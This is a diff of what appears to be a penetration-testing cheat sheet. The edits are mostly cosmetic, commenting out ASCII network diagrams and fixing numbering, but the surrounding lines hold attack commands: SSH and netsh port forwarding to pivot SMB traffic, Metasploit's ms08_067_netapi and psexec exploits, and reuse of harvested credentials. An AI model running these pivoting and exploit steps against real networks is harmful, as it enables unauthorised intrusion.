@@ -3,7 +3,7 @@
 #> script ‐af name.it.something.txt
 
 
-2-‐ Enumeration & Discovery: WINDOWS & some linux:
+2- Enumeration & Discovery: WINDOWS & some linux:
 
 systeminfo	
 netstat ‐ano | findstr "ESTABLISHED" 
@@ -67,7 +67,7 @@ Reverse SSh Tunneling:
 
 
 
-4	‐ Redirect Metasploit via Tunneling:	
+4‐ Redirect Metasploit via Tunneling:	
 
 
 Payload INFO:
@@ -86,14 +86,14 @@ redirector:fwd‐back‐home
 
 #> ssh username@10.0.0.130 ‐L 5445:10.0.0.80:445 ‐R 8080:0.0.0.0:8080
 
-_________           __________           _________
-| 5445‐>*|‐‐‐‐‐>22‐|‐‐‐‐‐‐‐‐\ |	   	    |	        |
-|	       |	       |	       *>‐‐‐‐‐‐‐‐>|445	    |		
-| Kali	 |	       |	        |		      | ^/      |
-|_______8080<‐‐‐‐‐‐|*‐‐‐‐‐8080|<‐‐‐‐‐‐‐ |*/	      |
-10.0.0.110	       | UBUNTU   |	 	      |Win Tgt  |
-		               |__________|		      |_________|
-		                10.0.0.130		        10.0.0.80
+#- _________           __________            _________
+#- | 5445‐>*|‐‐‐‐‐>22‐|‐‐‐‐‐‐‐‐\ |	    |	      |
+#- |	    |	      |	        *>‐‐‐‐‐‐‐‐->|445      |		
+#- | Kali   |	      |	         |  	    | ^/      |
+#- |_______8080<‐‐‐‐‐‐|*‐‐‐‐‐8080|<‐‐‐‐‐‐‐--|*/	      |
+#- 10.0.0.110	      | UBUNTU   |	    |Win Tgt  |
+		      |__________|	    |_________|
+		       10.0.0.130	     10.0.0.80
 
 
 
@@ -127,13 +127,14 @@ From Windows 7 (redirector):
 #> netsh interface portproxy add v4tov4 listenport=2929 listenaddress=0.0.0.0 connectport=445 connectaddress=10.0.0.80 
 #> netsh interface portporxy add v4tov4 listenport=3939 listenaddress=0.0.0.0 connectport=3939 connectaddress=10.0.0.110
 
-	__________ 	         __________		              ___________
-	|	      *|‐‐‐‐‐‐>2929|‐‐‐‐‐‐‐>*|‐‐‐‐‐‐‐‐‐‐‐‐‐-->|445	    |
-	| Kali	 |	         |  Win7   |		            |^/	      |
-	|________<‐3939‐‐‐‐‐‐|*<‐‐‐‐‐3939<‐‐‐‐‐‐‐‐‐‐‐‐--|*	      |
-	10.0.0.110	         |_________|		            | Win tgt |
-				                   .50                    |_________|
-					 		                                        .80
+#-	__________ 	     __________		         ___________
+#-	|	*|‐‐‐‐‐‐>2929|‐‐‐‐‐‐‐>*|‐‐‐‐‐‐‐‐‐‐‐‐‐-->|445	    |
+#-	| Kali	 |	     |  Win7   |		|^/	    |
+#-	|________<‐3939‐‐‐‐‐‐|*<‐‐‐‐‐3939<‐‐‐‐‐‐‐‐‐‐‐‐--|*	    |
+#-	10.0.0.110	     |_________|		|  Win tgt  |
+#-				 .50                    |___________|
+#-							     .80
+
 @Kali:		
 ‐msfconsole ‐ Win‐XP | ms08_067_netapi
 #> use exploit/windows/smb/ms08_067_netapi
@@ -157,14 +158,14 @@ From Windows 7 (redirector):
  
 Pivot through a Windows‐7
 ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
-				
-			  	                            __________
- 	__________		             _______//^-PIVOT   \\
- 	|	        | 		          |	        |         \\_________	
-	|	       *|‐‐‐‐‐‐‐‐‐‐‐‐‐->| WinXP   |	        | win_svr |
-	|  Kali   |		            |_________|	        |         |
-	|_________|               10.0.0.50	          |_________|
-   10.0.0.110				                        Target: 192.39.0.40
+#-				
+#-			  	            __________
+#-	 _________		   _______//^-PIVOT   \\
+#- 	|	  | 		  |	    |          \\_________	
+#-	|	 *|‐‐‐‐‐‐‐‐‐‐‐‐‐->| WinXP   |	        | win_svr  |
+#-	|  Kali   |		  |_________|	        |          |
+#-	|_________|                10.0.0.50	        |__________|
+#-	 10.0.0.110				     Target: 192.39.0.40
 
 
 From msfconsole:
@@ -180,7 +181,7 @@ From msfconsole:
 
 
 
-5	‐ EXPLOITATION ON TARGET:	
+5‐ EXPLOITATION ON TARGET:	
 
 ‐ *See Meterpreter cheat sheet*
 
@@ -225,8 +226,6 @@ If that doesn't work...
 ‐‐‐‐‐‐‐‐ psExec ‐‐‐‐‐‐‐
 
 Found new domain? (try usernames/passwords youve seen on other accounts) #> use exploit/windows/smb/psexec
- 
-#>
 
 
 6‐ Transferring Files:	
